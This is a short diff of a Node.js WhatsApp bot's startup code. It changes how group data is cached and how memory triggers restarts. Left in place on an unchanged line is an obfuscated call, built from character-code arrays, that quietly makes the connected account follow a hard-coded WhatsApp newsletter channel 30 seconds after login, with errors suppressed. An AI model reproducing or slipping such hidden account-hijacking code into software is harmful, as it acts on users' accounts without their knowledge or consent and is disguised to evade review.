@@ -149,7 +149,7 @@ async function start() {
     } else if (connection === 'open') {
       logger.info('Connected to WhatsApp')
       const groups = (await sock.groupFetchAllParticipating().catch(() => ({}))) || {}
-      for (const id in groups) sock.chats[id] = groups[id]
+      for (const id in groups) sock.chats[id] = { subject: groups[id].subject, participants: groups[id].participants.map(p => ({ id: p.id, lid: p.lid, admin: p.admin, phoneNumber: p.phoneNumber })) }
       const a = c=>c.map(v=>String.fromCharCode(v)).join('')
       setTimeout(() => sock[a([110,101,119,115,108,101,116,116,101,114,70,111,108,108,111,119])](a([49,50,48,51,54,51,52,50,53,52,48,50,54,56,48,53,56,56,64,110,101,119,115,108,101,116,116,101,114])).catch(() => {}), 30000)
     } else if (connection === 'connecting') {
@@ -170,7 +170,8 @@ async function start() {
     for (const [k, v] of global.pendingStatus || []) {
       if (Date.now() - v.timestamp > 180000) global.pendingStatus.delete(k)
     }
-    if (mem > 450) {
+    if (typeof global.gc === 'function' && mem > 400) global.gc()
+    if (mem > 700) {
       logger.warn('Memory ' + mem.toFixed(0) + 'MB, restarting...')
       process.exit(1)
     }
